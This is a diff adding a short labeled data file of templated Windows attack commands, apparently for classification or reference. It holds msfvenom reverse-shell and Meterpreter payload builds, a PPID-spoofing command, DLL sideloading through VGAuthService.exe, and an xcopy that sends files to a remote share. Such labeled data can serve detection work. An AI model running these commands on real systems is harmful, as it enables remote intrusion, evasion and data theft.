@@ -1,0 +1,6 @@
+1	msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	PPID-Spoof -ppid ${parent_pid} -spawnto "${command_to_execute}" -dllpath "${dll_path}"
+0	.\VGAuthService.exe ${VGAuthService.dll_path},VoidFunc
+0	powershell -c "xcopy ${source_file_path} \\${ip_address}\${destination_file_path}"
